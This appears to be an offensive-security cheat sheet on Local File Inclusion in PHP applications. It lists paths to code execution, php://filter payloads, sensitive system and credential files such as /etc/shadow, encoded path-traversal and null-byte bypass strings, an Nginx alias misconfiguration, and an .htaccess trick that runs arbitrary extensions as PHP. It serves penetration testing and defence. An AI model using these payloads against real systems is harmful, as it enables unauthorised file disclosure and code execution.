# Local File Inclusion (LFI)
- RCE
  - [PHP filter chain generator](https://github.com/synacktiv/php_filter_chain_generator)
  - access.log / error.log
  - /proc/self/environ `user-agent`
  - phpinfo `tmp file location`
  - /tmp/sess\_{session\_name} `control session content`
  - [session.upload\_progress](https://blog.orange.tw/2018/10/#session-tragedy)
- Trigger `php`
  - require()
  - require\_once()
  - include()
  - include\_once()
- Stream Wrapper
  - `php://filter/<action><filter>/resource=<file>`

    | action    | filter                   |
    |:----------|:-------------------------|
    | \<empty\> | convert.base64-encode    |
    | read=     | string.rot13             |
    | write=    | zlib.deflate             |
    |           | zlib.inflate             |

    ```
    Multiple Filter
    ---------------
    php://filter/read=convert.base64-encode/
                 read=string.rot13/
                 ...
                 resource=phpinfo.php
    ```

  - `php://input`
  - `php://fd`
- Sensitive Files
  - Source Code
  - Version Contorl
    - [.git](https://github.com/arthaud/git-dumper)
    - .svn
    - .bzr
  - Hidden File
    - [.DS\_Store](https://github.com/lijiejie/ds_store_exp)
    - .index.php.swp
  - Unix
    - /etc/hosts
    - /etc/passwd
    - /etc/shadow
    - /proc/net/[tcp,udp]
    - /proc/net/\*
    - /proc/net/arp
    - /proc/net/fib\_trie
    - /proc/net/route
    - /proc/sched\_debug
    - /proc/self/cwd
    - /proc/self/environ
    - /proc/self/exe
    - /proc/self/fd/[num]
  - Web Server Config Files
    - /etc/apache2/apache2.conf
    - /etc/apache2/sites-available/000-default.conf
    - /etc/nginx/nginx.conf
    - /etc/php/php.ini
- Path Bypass
  - Encoding

    | Encoding                        | Payload   | Decode |
    |:--------------------------------|:----------|:-------|
    | unicode/UTF-8 encoding          | %c1%1c    |        |
    |                                 | %c0%af    |        |
    | unicode/UTF-7 encoding          |           |        |
    | overlong UTF-8 unicode encoding | %c0%2e    | `.`    |
    |                                 | %e0%40%ae | `.`    |
    |                                 | %c0ae     | `.`    |
    |                                 | %c0%af    | `/`    |
    |                                 | %e0%80%af | `/`    |
    |                                 | %c0%2f    | `/`    |
    |                                 | %c0%5c    | `\`    |
    |                                 | %c0%80%5c | `\`    |
    | URL encoding                    | %2e%2e%2f | `../`  |
    |                                 | %2e%2e/   | `../`  |
    |                                 | ..%2f     | `../`  |
    |                                 | %2e%2e%5c | `..\`  |
    | double URL encoding             | %252F     | `/`    |
    |                                 | %255C     | `\`    |
    | 16-bit Unicode encoding         | %u002e    | `.`    |
    |                                 | %u2215    | `/`    |
    |                                 | %u2216    | `\`    |

  - Null Bytes
    > bypass file type checking

    - `../../../../../passwd%00.jpg`
  - Mangled Paths
    > bypass removing traversal sequences

    - `....//`
    - `...\//`
    - `..//..//..\`        
  - Nginx Misconfiguration
    > Nginx off-by-slash fail
    >
    > `http://127.0.0.1/static../settings.py` => `/home/app/static/../settings.py`
    
    ```
    location /static {
      alias /home/app/static/;
    }
    ```

- Extension Bypass
  - pHP
  - pht, phtml, php[3,4,5,7]
  - html, svg
  - Apache2 Feature
    > xxx.abc => run as php file

    ```
    .htaccess
    ---------
    <FilesMatch "abc">
      SetHandler application/x-httpd-php
    </FilesMatch>
    ```
